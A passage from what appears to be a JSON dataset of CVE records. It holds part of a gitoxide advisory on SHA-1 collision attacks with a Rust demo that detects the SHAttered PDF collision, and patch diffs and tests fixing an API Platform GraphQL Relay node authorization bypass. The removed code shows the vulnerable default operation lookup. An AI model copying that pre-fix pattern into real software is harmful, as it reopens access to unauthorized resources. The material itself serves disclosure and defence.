CollisionResult::Ok(digest) => Ok(gix::ObjectId::Sha1(digest.into())),\n        CollisionResult::Mitigated(_) => unreachable!(),\n        CollisionResult::Collision(digest) => Err(format!(\n            \"Collision attack: {}\",\n            gix::ObjectId::Sha1(digest.into()).to_hex()\n        )),\n    }\n}\n\nfn main() {\n    dbg!(sha1_oid_of_file(\"shattered-1.pdf\"));\n    dbg!(sha1_oid_of_file(\"shattered-2.pdf\"));\n    dbg!(sha1dc_oid_of_file(\"shattered-1.pdf\"));\n    dbg!(sha1dc_oid_of_file(\"shattered-2.pdf\"));\n}\nThe output is as follows:\n[src/main.rs:24:5] sha1_oid_of_file(\"shattered-1.pdf\") = Sha1(38762cf7f55934b34d179ae6a4c80cadccbb7f0a)\n[src/main.rs:25:5] sha1_oid_of_file(\"shattered-2.pdf\") = Sha1(38762cf7f55934b34d179ae6a4c80cadccbb7f0a)\n[src/main.rs:26:5] sha1dc_oid_of_file(\"shattered-1.pdf\") = Err(\n    \"Collision attack: 38762cf7f55934b34d179ae6a4c80cadccbb7f0a\",\n)\n[src/main.rs:27:5] sha1dc_oid_of_file(\"shattered-2.pdf\") = Err(\n    \"Collision attack: 38762cf7f55934b34d179ae6a4c80cadccbb7f0a\",\n)\nThe latter behaviour matches Git.\nSince the SHAttered PDFs are not in a valid format for Git objects, a direct proof\u2010of\u2010concept using higher\u2010level APIs cannot be immediately demonstrated without significant computational resources.\nImpact\nAn attacker with the ability to mount a collision attack on SHA-1 like the SHAttered or SHA-1 is a Shambles attacks could create two distinct Git objects with the same hash. This is becoming increasingly affordable for well\u2010resourced attackers, with the Shambles researchers in 2020 estimating $45k for a chosen\u2010prefix collision or $11k for a classical collision, and projecting less than $10k for a chosen\u2010prefix collision by 2025. The result could be used to disguise malicious repository contents, or potentially exploit assumptions in the logic of programs using gitoxide to cause further vulnerabilities.\nThis vulnerability affects any user of gitoxide, including gix-* library crates, that reads or writes Git objects.\nSeverity\nModerate\n6.8\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N\nCVE ID\nCVE-2025-31130\nWeaknesses\nCWE-328\nCredits\nemilazy\nReporter\nEliahKagan\nAnalyst\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes a proof-of-concept program demonstrating the vulnerability using SHAttered PDFs to showcase the SHA-1 collision.",
                "url": "https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-2frx-2596-x5r6"
            }
        ],
        "sw_version": "v0.41.0",
        "sw_version_wget": "https://github.com/GitoxideLabs/gitoxide/archive/refs/tags/v0.41.0.zip"
    },
    "CVE-2025-31481": {
        "cwe": [
            {
                "id": "CWE-863",
                "value": "CWE-863: Incorrect Authorization"
            }
        ],
        "description": "API Platform Core is a system to create hypermedia-driven REST and GraphQL APIs. Using the Relay special node type you can bypass the configured security on an operation. This vulnerability is fixed in 4.0.22 and 3.4.17.",
        "languages": [
            "PHP"
        ],
        "patch_commits": [
            {
                "content": "fix(graphql): access to unauthorized resource using node Relay\n\nFilename: src/GraphQl/Metadata/RuntimeOperationMetadataFactory.php:\n```\n@@ -0,0 +1,55 @@\n+<?php\n+\n+/*\n+ * This file is part of the API Platform project.\n+ *\n+ * (c) K\u00e9vin Dunglas <dunglas@gmail.com>\n+ *\n+ * For the full copyright and license information, please view the LICENSE\n+ * file that was distributed with this source code.\n+ */\n+\n+declare(strict_types=1);\n+\n+namespace ApiPlatform\\GraphQl\\Metadata;\n+\n+use ApiPlatform\\Metadata\\Exception\\InvalidArgumentException;\n+use ApiPlatform\\Metadata\\GraphQl\\Query;\n+use ApiPlatform\\Metadata\\Operation;\n+use ApiPlatform\\Metadata\\Operation\\Factory\\OperationMetadataFactoryInterface;\n+use ApiPlatform\\Metadata\\Resource\\Factory\\ResourceMetadataCollectionFactoryInterface;\n+use Symfony\\Component\\Routing\\Exception\\ExceptionInterface as RoutingExceptionInterface;\n+use Symfony\\Component\\Routing\\RouterInterface;\n+\n+/**\n+ * This factory runs in the ResolverFactory and is used to find out a Relay node's operation.\n+ */\n+final class RuntimeOperationMetadataFactory implements OperationMetadataFactoryInterface\n+{\n+    public function __construct(private readonly ResourceMetadataCollectionFactoryInterface $resourceMetadataCollectionFactory, private readonly RouterInterface $router)\n+    {\n+    }\n+\n+    public function create(string $uriTemplate, array $context = []): ?Operation\n+    {\n+        try {\n+            $parameters = $this->router->match($uriTemplate);\n+        } catch (RoutingExceptionInterface $e) {\n+            throw new InvalidArgumentException(\\sprintf('No route matches \"%s\".', $uriTemplate), $e->getCode(), $e);\n+        }\n+\n+        if (!isset($parameters['_api_resource_class'])) {\n+            throw new InvalidArgumentException(\\sprintf('The route \"%s\" is not an API route, it has no resource class in the defaults.', $uriTemplate));\n+        }\n+\n+        foreach ($this->resourceMetadataCollectionFactory->create($parameters['_api_resource_class']) as $resource) {\n+            foreach ($resource->getGraphQlOperations() ?? [] as $operation) {\n+                if ($operation instanceof Query && !$operation->getResolver()) {\n+                    return $operation;\n+                }\n+            }\n+        }\n+\n+        throw new InvalidArgumentException(\\sprintf('No operation found for id \"%s\".', $uriTemplate));\n+    }\n+}\n```\n\nFilename: src/GraphQl/Resolver/Factory/ResolverFactory.php:\n```\n@@ -15,21 +15,28 @@\nuse ApiPlatform\\GraphQl\\State\\Provider\\NoopProvider;\n use ApiPlatform\\Metadata\\DeleteOperationInterface;\n+use ApiPlatform\\Metadata\\Exception\\InvalidArgumentException;\n use ApiPlatform\\Metadata\\GraphQl\\Mutation;\n use ApiPlatform\\Metadata\\GraphQl\\Operation;\n use ApiPlatform\\Metadata\\GraphQl\\Query;\n+use ApiPlatform\\Metadata\\Operation\\Factory\\OperationMetadataFactoryInterface;\n use ApiPlatform\\Metadata\\Property\\Factory\\PropertyMetadataFactoryInterface;\n use ApiPlatform\\State\\Pagination\\ArrayPaginator;\n use ApiPlatform\\State\\ProcessorInterface;\n use ApiPlatform\\State\\ProviderInterface;\n use GraphQL\\Type\\Definition\\ResolveInfo;\n+use Symfony\\Component\\HttpKernel\\Exception\\NotFoundHttpException;\n \n class ResolverFactory implements ResolverFactoryInterface\n {\n     public function __construct(\n         private readonly ProviderInterface $provider,\n         private readonly ProcessorInterface $processor,\n+        private readonly ?OperationMetadataFactoryInterface $operationMetadataFactory = null,\n     ) {\n+        if (!$operationMetadataFactory) {\n+            throw new InvalidArgumentException(\\sprintf('Not injecting the \"%s\" exposes Relay nodes to a security risk.', OperationMetadataFactoryInterface::class));\n+        }\n     }\n \n     public function __invoke(?string $resourceClass = null, ?string $rootClass = null, ?Operation $operation = null, ?PropertyMetadataFactoryInterface $propertyMetadataFactory = null): callable\n\n@@ -70,7 +77,13 @@\npublic function __invoke(?string $resourceClass = null, ?string $rootClass = nul\n     private function resolve(?array $source, array $args, ResolveInfo $info, ?string $rootClass = null, ?Operation $operation = null, mixed $body = null)\n     {\n         // Handles relay nodes\n-        $operation ??= new Query();\n+        if (!$operation) {\n+            if (!isset($args['id'])) {\n+                throw new NotFoundHttpException('No node found.');\n+            }\n+\n+            $operation = $this->operationMetadataFactory->create($args['id']);\n+        }\n \n         $graphQlContext = [];\n         $context = ['source' => $source, 'args' => $args, 'info' => $info, 'root_class' => $rootClass, 'graphql_context' => &$graphQlContext];\n```\n\nFilename: src/GraphQl/Tests/Metadata/RuntimeOperationMetadataFactoryTest.php:\n```\n@@ -0,0 +1,144 @@\n+<?php\n+\n+/*\n+ * This file is part of the API Platform project.\n+ *\n+ * (c) K\u00e9vin Dunglas <dunglas@gmail.com>\n+ *\n+ * For the full copyright and license information, please view the LICENSE\n+ * file that was distributed with this source code.\n+ */\n+\n+declare(strict_types=1);\n+\n+namespace ApiPlatform\\GraphQl\\Tests\\Metadata;\n+\n+use ApiPlatform\\GraphQl\\Metadata\\RuntimeOperationMetadataFactory;\n+use ApiPlatform\\Metadata\\ApiResource;\n+use ApiPlatform\\Metadata\\GraphQl\\Query;\n+use ApiPlatform\\Metadata\\Resource\\Factory\\ResourceMetadataCollectionFactoryInterface;\n+use ApiPlatform\\Metadata\\Resource\\ResourceMetadataCollection;\n+use PHPUnit\\Framework\\TestCase;\n+use Symfony\\Component\\Routing\\Exception\\ResourceNotFoundException;\n+use Symfony\\Component\\Routing\\RouterInterface;\n+\n+class RuntimeOperationMetadataFactoryTest extends TestCase\n+{\n+    public function testCreate(): void\n+    {\n+        $resourceClass = 'Dummy';\n+        $operationName = 'item_query';\n+\n+        $operation = (new Query())->withName($operationName);\n+        $resourceMetadata = (new ApiResource())->withGraphQlOperations([$operationName => $operation]);\n+        $resourceMetadataCollection = new ResourceMetadataCollection($resourceClass, [$resourceMetadata]);\n+\n+        $resourceMetadataCollectionFactory = $this->createMock(ResourceMetadataCollectionFactoryInterface::class);\n+        $resourceMetadataCollectionFactory->expects($this->once())\n+            ->method('create')\n+            ->with($resourceClass)\n+            ->willReturn($resourceMetadataCollection);\n+\n+        $router = $this->createMock(RouterInterface::class);\n+        $router->expects($this->once())\n+            ->method('match')\n+            ->with('/dummies/1')\n+            ->willReturn([\n+                '_api_resource_class' => $resourceClass,\n+                '_api_operation_name' => $operationName,\n+            ]);\n+\n+        $factory = new RuntimeOperationMetadataFactory($resourceMetadataCollectionFactory, $router);\n+        $this->assertEquals($operation, $factory->create('/dummies/1'));\n+    }\n+\n+    public function testCreateThrowsExceptionWhenRouteNotFound(): void\n+    {\n+        $this->expectException(\\ApiPlatform\\Metadata\\Exception\\InvalidArgumentException::class);\n+        $this->expectExceptionMessage('No route matches \"/unknown\".');\n+\n+        $router = $this->createMock(RouterInterface::class);\n+        $router->expects($this->once())\n+            ->method('match')\n+            ->with('/unknown')\n+            ->willThrowException(new ResourceNotFoundException());\n+\n+        $resourceMetadataCollectionFactory = $this->createMock(ResourceMetadataCollectionFactoryInterface::class);\n+\n+        $factory = new RuntimeOperationMetadataFactory($resourceMetadataCollectionFactory, $router);\n+        $factory->create('/unknown');\n+    }\n+\n+    public function testCreateThrowsExceptionWhenResourceClassMissing(): void\n+    {\n+        $this->expectException(\\ApiPlatform\\Metadata\\Exception\\InvalidArgumentException::class);\n+        $this->expectExceptionMessage('The route \"/dummies/1\" is not an API route, it has no resource class in the defaults.');\n+\n+        $router = $this->createMock(RouterInterface::class);\n+        $router->expects($this->once())\n+            ->method('match')\n+            ->with('/dummies/1')\n+            ->willReturn([]);\n+\n+        $resourceMetadataCollectionFactory = $this->createMock(ResourceMetadataCollectionFactoryInterface::class);\n+\n+        $factory = new RuntimeOperationMetadataFactory($resourceMetadataCollectionFactory, $router);\n+        $factory->create('/dummies/1');\n+    }\n+\n+    public function testCreateThrowsExceptionWhenOperationNotFound(): void\n+    {\n+        $this->expectException(\\ApiPlatform\\Metadata\\Exception\\InvalidArgumentException::class);\n+        $this->expectExceptionMessage('No operation found for id \"/dummies/1\".');\n+\n+        $resourceClass = 'Dummy';\n+\n+        $resourceMetadataCollectionFactory = $this->createMock(ResourceMetadataCollectionFactoryInterface::class);\n+        $resourceMetadataCollectionFactory->expects($this->once())\n+            ->method('create')\n+            ->with($resourceClass)\n+            ->willReturn(new ResourceMetadataCollection($resourceClass, [new ApiResource()]));\n+\n+        $router = $this->createMock(RouterInterface::class);\n+        $router->expects($this->once())\n+            ->method('match')\n+            ->with('/dummies/1')\n+            ->willReturn([\n+                '_api_resource_class' => $resourceClass,\n+            ]);\n+\n+        $factory = new RuntimeOperationMetadataFactory($resourceMetadataCollectionFactory, $router);\n+        $factory->create('/dummies/1');\n+    }\n+\n+    public function testCreateIgnoresOperationsWithResolvers(): void\n+    {\n+        $this->expectException(\\ApiPlatform\\Metadata\\Exception\\InvalidArgumentException::class);\n+        $this->expectExceptionMessage('No operation found for id \"/dummies/1\".');\n+\n+        $resourceClass = 'Dummy';\n+        $operationName = 'item_query';\n+\n+        $operation = (new Query())->withResolver('t')->withName($operationName);\n+        $resourceMetadata = (new ApiResource())->withGraphQlOperations([$operationName => $operation]);\n+        $resourceMetadataCollection = new ResourceMetadataCollection($resourceClass, [$resourceMetadata]);\n+\n+        $resourceMetadataCollectionFactory = $this->createMock(ResourceMetadataCollectionFactoryInterface::class);\n+        $resourceMetadataCollectionFactory->expects($this->once())\n+            ->method('create')\n+            ->with($resourceClass)\n+            ->willReturn($resourceMetadataCollection);\n+\n+        $router = $this->createMock(RouterInterface::class);\n+        $router->expects($this->once())\n+            ->method('match')\n+            ->with('/dummies/1')\n+            ->willReturn([\n+                '_api_resource_class' => $resourceClass,\n+                '_api_operation_name' => $operationName,\n+            ]);\n+\n+        $factory = new RuntimeOperationMetadataFactory($resourceMetadataCollectionFactory, $router);\n+        $factory->create('/dummies/1');\n+    }\n+}\n```\n\nFilename: src/GraphQl/Tests/Resolver/Factory/ResolverFactoryTest.php:\n```\n@@ -18,6 +18,7 @@\nuse ApiPlatform\\Metadata\\GraphQl\\Mutation;\n use ApiPlatform\\Metadata\\GraphQl\\Operation;\n use ApiPlatform\\Metadata\\GraphQl\\Query;\n+use ApiPlatform\\Metadata\\Operation\\Factory\\OperationMetadataFactoryInterface;\n use ApiPlatform\\Metadata\\Property\\Factory\\PropertyMetadataFactoryInterface;\n use ApiPlatform\\State\\ProcessorInterface;\n use ApiPlatform\\State\\ProviderInterface;\n\n@@ -45,7 +46,7 @@\npublic function testGraphQlResolver(?string $resourceClass = null, ?string $root\n         $resolveInfo = $this->createMock(ResolveInfo::class);\n         $resolveInfo->fieldName = 'test';\n \n-        $resolverFactory = new ResolverFactory($provider, $processor);\n+        $resolverFactory = new ResolverFactory($provider, $processor, $this->createMock(OperationMetadataFactoryInterface::class));\n         $this->assertEquals($resolverFactory->__invoke($resourceClass, $rootClass, $operation, $propertyMetadataFactory)(['test' => null], [], [], $resolveInfo), $returnValue);\n     }\n\n@@ -56,4 +57,21 @@\npublic static function graphQlQueries(): array\n             ['Dummy', 'Dummy', new Mutation(), (new Mutation())->withValidate(true), (new Mutation())->withValidate(true)->withWrite(true)],\n         ];\n     }\n+\n+    public function testGraphQlResolverWithNode(): void\n+    {\n+        $returnValue = new \\stdClass();\n+        $op = new Query(name: 'hi');\n+        $provider = $this->createMock(ProviderInterface::class);\n+        $provider->expects($this->once())->method('provide')->with($op)->willReturn($returnValue);\n+        $processor = $this->createMock(ProcessorInterface::class);\n+        $processor->expects($this->once())->method('process')->with($returnValue, $op)->willReturn($returnValue);\n+        $resolveInfo = $this->createMock(ResolveInfo::class);\n+        $resolveInfo->fieldName = 'test';\n+\n+        $operationFactory = $this->createMock(OperationMetadataFactoryInterface::class);\n+        $operationFactory->method('create')->with('/foo')->willReturn($op);\n+        $resolverFactory = new ResolverFactory($provider, $processor, $operationFactory);\n+        $this->assertSame($returnValue, $resolverFactory->__invoke()([], ['id' => '/foo'], [], $resolveInfo));\n+    }\n }\n```\n\nFilename: src/Metadata/Resource/Factory/OperationDefaultsTrait.php:\n```\n@@ -112,7 +112,7 @@\nprivate function getDefaultHttpOperations($resource): iterable\n \n     private function addDefaultGraphQlOperations(ApiResource $resource): ApiResource\n     {\n-        $operations = enum_exists($resource->getClass()) ? [new QueryCollection(paginationEnabled: false), new Query()] : [new QueryCollection(), new Query(), (new Mutation())->withName('update'), (new DeleteMutation())->withName('delete'), (new Mutation())->withName('create')];\n+        $operations = enum_exists($resource->getClass()) ? [new Query(), new QueryCollection(paginationEnabled: false)] : [new Query(), new QueryCollection(), (new Mutation())->withName('update'), (new DeleteMutation())->withName('delete'), (new Mutation())->withName('create')];\n         $graphQlOperations = [];\n         foreach ($operations as $operation) {\n             [$key, $operation] = $this->getOperationWithDefaults($resource, $operation);\n```\n\nFilename: src/Symfony/Bundle/Resources/config/graphql.xml:\n```\n@@ -191,6 +191,12 @@\n<service id=\"api_platform.graphql.resolver.factory.item\" class=\"ApiPlatform\\GraphQl\\Resolver\\Factory\\ResolverFactory\" public=\"false\">\n             <argument type=\"service\" id=\"api_platform.graphql.state_provider\" />\n             <argument type=\"service\" id=\"api_platform.graphql.state_processor\" />\n+            <argument type=\"service\" id=\"api_platform.graphql.runtime_operation_metadata_factory\" />\n+        </service>\n+\n+        <service id=\"api_platform.graphql.runtime_operation_metadata_factory\" class=\"ApiPlatform\\GraphQl\\Metadata\\RuntimeOperationMetadataFactory\" public=\"false\">\n+            <argument type=\"service\" id=\"api_platform.metadata.resource.metadata_collection_factory\" />\n+            <argument type=\"service\" id=\"api_platform.router\" />\n         </service>\n \n         <!-- Resolver Stages -->\n```\n\nFilename: tests/Functional/GraphQl/SecurityTest.php:\n```\n@@ -26,7 +26,6 @@\nfinal class SecurityTest extends ApiTestCase\n {\n     use RecreateSchemaTrait;\n     use SetupClassResourcesTrait;\n-    protected static ?bool $alwaysBootKernel = false;\n \n     /**\n      * @return class-string[]\n```",
                "url": "https://github.com/api-platform/core/commit/55712452b4f630978537bdb2a07dc958202336bb"
            },
            {
                "content": "fix(graphql): access to unauthorized resource using node Relay\n\nFilename: src/GraphQl/Metadata/RuntimeOperationMetadataFactory.php:\n```\n@@ -0,0 +1,55 @@\n+<?php\n+\n+/*\n+ * This file is part of the API Platform project.\n+ *\n+ * (c) K\u00e9vin Dunglas <dunglas@gmail.com>\n+ *\n+ * For the full copyright and license information, please view the LICENSE\n+ * file that was distributed with this source code.\n+ */\n+\n+declare(strict_types=1);\n+\n+namespace ApiPlatform\\GraphQl\\Metadata;\n+\n+use ApiPlatform\\Metadata\\Exception\\InvalidArgumentException;\n+use ApiPlatform\\Metadata\\GraphQl\\Query;\n+use ApiPlatform\\Metadata\\Operation;\n+use ApiPlatform\\Metadata\\Operation\\Factory\\OperationMetadataFactoryInterface;\n+use ApiPlatform\\Metadata\\Resource\\Factory\\ResourceMetadataCollectionFactoryInterface;\n+use Symfony\\Component\\Routing\\Exception\\ExceptionInterface as RoutingExceptionInterface;\n+use Symfony\\Component\\Routing\\RouterInterface;\n+\n+/**\n+ * This factory runs in the ResolverFactory and is used to find out a Relay node's operation.\n+ */\n+final class RuntimeOperationMetadataFactory implements OperationMetadataFactoryInterface\n+{\n+    public function __construct(private readonly ResourceMetadataCollectionFactoryInterface $resourceMetadataCollectionFactory, private readonly RouterInterface $router)\n+    {\n+    }\n+\n+    public function create(string $uriTemplate, array $context = []): ?Operation\n+    {\n+        try {\n+            $parameters = $this->router->match($uriTemplate);\n+        } catch (RoutingExceptionInterface $e) {\n+            throw new InvalidArgumentException(\\sprintf('No route matches \"%s\".', $uriTemplate), $e->getCode(), $e);\n+        }\n+\n+        if (!isset($parameters['_api_resource_class'])) {\n+            throw new InvalidArgumentException(\\sprintf('The route \"%s\" is not an API route, it has no resource class in the defaults.', $uriTemplate));\n+        }\n+\n+        foreach ($this->resourceMetadataCollectionFactory->create($parameters['_api_resource_class']) as $resource) {\n+            foreach ($resource->getGraphQlOperations() ?? [] as $operation) {\n+                if ($operation instanceof Query && !$operation->getResolver()) {\n+                    return $operation;\n+                }\n+            }\n+        }\n+\n+        throw new InvalidArgumentException(\\sprintf('No operation found for id \"%s\".', $uriTemplate));\n+    }\n+}\n```\n\nFilename: src/GraphQl/Resolver/Factory/ResolverFactory.php:\n```\n@@ -15,21 +15,28 @@\nuse ApiPlatform\\GraphQl\\State\\Provider\\NoopProvider;\n use ApiPlatform\\Metadata\\DeleteOperationInterface;\n+use ApiPlatform\\Metadata\\Exception\\InvalidArgumentException;\n use ApiPlatform\\Metadata\\GraphQl\\Mutation;\n use ApiPlatform\\Metadata\\GraphQl\\Operation;\n use ApiPlatform\\Metadata\\GraphQl\\Query;\n+use ApiPlatform\\Metadata\\Operation\\Factory\\OperationMetadataFactoryInterface;\n use ApiPlatform\\Metadata\\Property\\Factory\\PropertyMetadataFactoryInterface;\n use ApiPlatform\\State\\Pagination\\ArrayPaginator;\n use ApiPlatform\\State\\ProcessorInterface;\n use ApiPlatform\\State\\ProviderInterface;\n use GraphQL\\Type\\Definition\\ResolveInfo;\n+use Symfony\\Component\\HttpKernel\\Exception\\NotFoundHttpException;\n \n class ResolverFactory implements ResolverFactoryInterface\n {\n     public function __construct(\n         private readonly ProviderInterface $provider,\n         private readonly ProcessorInterface $processor,\n+        private readonly ?OperationMetadataFactoryInterface $operationMetadataFactory = null,\n     ) {\n+        if (!$operationMetadataFactory) {\n+            throw new InvalidArgumentException(\\sprintf('Not injecting the \"%s\" exposes Relay nodes to a security risk.', OperationMetadataFactoryInterface::class));\n+        }\n     }\n \n     public function __invoke(?string $resourceClass = null, ?string $rootClass = null, ?Operation $operation = null, ?PropertyMetadataFactoryInterface $propertyMetadataFactory = null): callable\n\n@@ -70,7 +77,13 @@\npublic function __invoke(?string $resourceClass = null, ?string $rootClass = nul\n     private function resolve(?array $source, array $args, ResolveInfo $info, ?string $rootClass = null, ?Operation $operation = null, mixed $body = null)\n     {\n         // Handles relay nodes\n-        $operation ??= new Query();\n+        if (!$operation) {\n+            if (!isset($args['id'])) {\n+                throw new NotFoundHttpException('No node found.');\n+            }\n+\n+            $operation = $this->operationMetadataFactory->create($args['id']);\n+        }\n \n         $graphQlContext = [];\n         $context = ['source' => $source, 'args' => $args, 'info' => $info, 'root_class' => $rootClass, 'graphql_context' => &$graphQlContext];\n```\n\nFilename: src/GraphQl/Tests/Metadata/RuntimeOperationMetadataFactoryTest.php:\n```\n@@ -0,0 +1,144 @@\n+<?php\n+\n+/*\n+ * This file is part of the API Platform project.\n+ *\n+ * (c) K\u00e9vin Dunglas <dunglas@gmail.com>\n+ *\n+ * For the full copyright and license information, please view the LICENSE\n+ * file that was distributed with this source code.\n+ */\n+\n+declare(strict_types=1);\n+\n+namespace ApiPlatform\\GraphQl\\Tests\\Metadata;\n+\n+use ApiPlatform\\GraphQl\\Metadata\\RuntimeOperationMetadataFactory;\n+use ApiPlatform\\Metadata\\ApiResource;\n+use ApiPlatform\\Metadata\\GraphQl\\Query;\n+use ApiPlatform\\Metadata\\Resource\\Factory\\ResourceMetadataCollectionFactoryInterface;\n+use ApiPlatform\\Metadata\\Resource\\ResourceMetadataCollection;\n+use PHPUnit\\Framework\\TestCase;\n+use Symfony\\Component\\Routing\\Exception\\ResourceNotFoundException;\n+use Symfony\\Component\\Routing\\RouterInterface;\n+\n+class RuntimeOperationMetadataFactoryTest extends TestCase\n+{\n+    public function testCreate(): void\n+    {\n+        $resourceClass = 'Dummy';\n+        $operationName = 'item_query';\n+\n+        $operation = (new Query())->withName($operationName);\n+        $resourceMetadata = (new ApiResource())->withGraphQlOperations([$operationName => $operation]);\n+        $resourceMetadataCollection = new ResourceMetadataCollection($resourceClass, [$resourceMetadata]);\n+\n+        $resourceMetadataCollectionFactory = $this->createMock(ResourceMetadataCollectionFactoryInterface::class);\n+        $resourceMetadataCollectionFactory->expects($this->once())\n+            ->method('create')\n+            ->with($resourceClass)\n+            ->willReturn($resourceMetadataCollection);\n+\n+        $router = $this->createMock(RouterInterface::class);\n+        $router->expects($this->once())\n+            ->method('match')\n+            ->with('/dummies/1')\n+            ->willReturn([\n+                '_api_resource_class' => $resourceClass,\n+                '_api_operation_name' => $operationName,\n+            ]);\n+\n+        $factory = new RuntimeOperationMetadataFactory($resourceMetadataCollectionFactory, $router);\n+        $this->assertEquals($operation, $factory->create('/dummies/1'));\n+    }\n+\n+    public function testCreateThrowsExceptionWhenRouteNotFound(): void\n+    {\n+        $this->expectException(\\ApiPlatform\\Metadata\\Exception\\InvalidArgumentException::class);\n+        $this->expectExceptionMessage('No route matches \"/unknown\".');\n+\n+        $router = $this->createMock(RouterInterface::class);\n+        $router->expects($this->once())\n+            ->method('match')\n+            ->with('/unknown')\n+            ->willThrowException(new ResourceNotFoundException());\n+\n+        $resourceMetadataCollectionFactory = $this->createMock(ResourceMetadataCollectionFactoryInterface::class);\n+\n+        $factory = new RuntimeOperationMetadataFactory($resourceMetadataCollectionFactory, $router);\n+        $factory->create('/unknown');\n+    }\n+\n+    public function testCreateThrowsExceptionWhenResourceClassMissing(): void\n+    {\n+        $this->expectException(\\ApiPlatform\\Metadata\\Exception\\InvalidArgumentException::class);\n+        $this->expectExceptionMessage('The route \"/dummies/1\" is not an API route, it has no resource class in the defaults.');\n+\n+        $router = $this->createMock(RouterInterface::class);\n+        $router->expects($this->once())\n+            ->method('match')\n+            ->with('/dummies/1')\n+            ->willReturn([]);\n+\n+        $resourceMetadataCollectionFactory = $this->createMock(ResourceMetadataCollectionFactoryInterface::class);\n+\n+        $factory = new RuntimeOperationMetadataFactory($resourceMetadataCollectionFactory, $router);\n+        $factory->create('/dummies/1');\n+    }\n+\n+    public function testCreateThrowsExceptionWhenOperationNotFound(): void\n+    {\n+        $this->expectException(\\ApiPlatform\\Metadata\\Exception\\InvalidArgumentException::class);\n+        $this->expectExceptionMessage('No operation found for id \"/dummies/1\".');\n+\n+        $resourceClass = 'Dummy';\n+\n+        $resourceMetadataCollectionFactory = $this->createMock(ResourceMetadataCollectionFactoryInterface::class);\n+        $resourceMetadataCollectionFactory->expects($this->once())\n+            ->method('create')\n+            ->with($resourceClass)\n+            ->willReturn(new ResourceMetadataCollection($resourceClass, [new ApiResource()]));\n+\n+        $router = $this->createMock(RouterInterface::class);\n+        $router->expects($this->once())\n+            ->method('match')\n+            ->with('/dummies/1')\n+            ->willReturn([\n+                '_api_resource_class' => $resourceClass,\n+            ]);\n+\n+        $factory = new RuntimeOperationMetadataFactory($resourceMetadataCollectionFactory, $router);\n+        $factory->create('/dummies/1');\n+    }\n+\n+    public function testCreateIgnoresOperationsWithResolvers(): void\n+    {\n+        $this->expectException(\\ApiPlatform\\Metadata\\Exception\\InvalidArgumentException::class);\n+        $this->expectExceptionMessage('No operation found for id \"/dummies/1\".');\n+\n+        $resourceClass = 'Dummy';\n+        $operationName = 'item_query';\n+\n+        $operation = (new Query())->withResolver('t')->withName($operationName);\n+        $resourceMetadata = (new ApiResource())->withGraphQlOperations([$operationName => $operation]);\n+        $resourceMetadataCollection = new ResourceMetadataCollection($resourceClass, [$resourceMetadata]);\n+\n+        $resourceMetadataCollectionFactory = $this->createMock(ResourceMetadataCollectionFactoryInterface::class);\n+        $resourceMetadataCollectionFactory->expects($this->once())\n+            ->method('create')\n+            ->with($resourceClass)\n+            ->willReturn($resourceMetadataCollection);\n+\n+        $router = $this->createMock(RouterInterface::class);\n+        $router->expects($this->once())\n+            ->method('match')\n+            ->with('/dummies/1')\n+            ->willReturn([\n+                '_api_resource_class' => $resourceClass,\n+                '_api_operation_name' => $operationName,\n+            ]);\n+\n+        $factory = new RuntimeOperationMetadataFactory($resourceMetadataCollectionFactory, $router);\n+        $factory->create('/dummies/1');\n+    }\n+}\n```\n\nFilename: src/GraphQl/Tests/Resolver/Factory/ResolverFactoryTest.php:\n```\n@@ -18,6 +18,7 @@\nuse ApiPlatform\\Metadata\\GraphQl\\Mutation;\n use ApiPlatform\\Metadata\\GraphQl\\Operation;\n use ApiPlatform\\Metadata\\GraphQl\\Query;\n+use ApiPlatform\\Metadata\\Operation\\Factory\\OperationMetadataFactoryInterface;\n use ApiPlatform\\Metadata\\Property\\Factory\\PropertyMetadataFactoryInterface;\n use ApiPlatform\\State\\ProcessorInterface;\n use ApiPlatform\\State\\ProviderInterface;\n\n@@ -43,7 +44,7 @@\npublic function testGraphQlResolver(?string $resourceClass = null, ?string $root\n         $resolveInfo = $this->createMock(ResolveInfo::class);\n         $resolveInfo->fieldName = 'test';\n \n-        $resolverFactory = new ResolverFactory($provider, $processor);\n+        $resolverFactory = new ResolverFactory($provider, $processor, $this->createMock(OperationMetadataFactoryInterface::class));\n         $this->assertEquals($resolverFactory->__invoke($resourceClass, $rootClass, $operation, $propertyMetadataFactory)(['test' => null], [], [], $resolveInfo), $returnValue);\n     }\n\n@@ -54,4 +55,21 @@\npublic static function graphQlQueries(): array\n             ['Dummy', 'Dummy', new Mutation(), (new Mutation())->withValidate(true), (new Mutation())->withValidate(true)->withWrite(true)],\n         ];\n     }\n+\n+    public function testGraphQlResolverWithNode(): void\n+    {\n+        $returnValue = new \\stdClass();\n+        $op = new Query(name: 'hi');\n+        $provider = $this->createMock(ProviderInterface::class);\n+        $provider->expects($this->once())->method('provide')->with($op)->willReturn($returnValue);\n+        $processor = $this->createMock(ProcessorInterface::class);\n+        $processor->expects($this->once())->method('process')->with($returnValue, $op)->willReturn($returnValue);\n+        $resolveInfo = $this->createMock(ResolveInfo::class);\n+        $resolveInfo->fieldName = 'test';\n+\n+        $operationFactory = $this->createMock(OperationMetadataFactoryInterface::class);\n+        $operationFactory->method('create')->with('/foo')->willReturn($op);\n+        $resolverFactory = new ResolverFactory($provider, $processor, $operationFactory);\n+        $this->assertSame($returnValue, $resolverFactory->__invoke()([], ['id' => '/foo'], [], $resolveInfo));\n+    }\n }\n```\n\nFilename: src/Laravel/ApiPlatformProvider.php:\n```\n@@ -17,6 +17,7 @@\nuse ApiPlatform\\GraphQl\\Error\\ErrorHandlerInterface;\n use ApiPlatform\\GraphQl\\Executor;\n use ApiPlatform\\GraphQl\\ExecutorInterface;\n+use ApiPlatform\\GraphQl\\Metadata\\RuntimeOperationMetadataFactory;\n use ApiPlatform\\GraphQl\\Resolver\\Factory\\ResolverFactory;\n use ApiPlatform\\GraphQl\\Resolver\\Factory\\ResolverFactoryInterface;\n use ApiPlatform\\GraphQl\\Resolver\\QueryCollectionResolverInterface;\n\n@@ -1273,7 +1274,15 @@\nprivate function registerGraphQl(Application $app): void\n         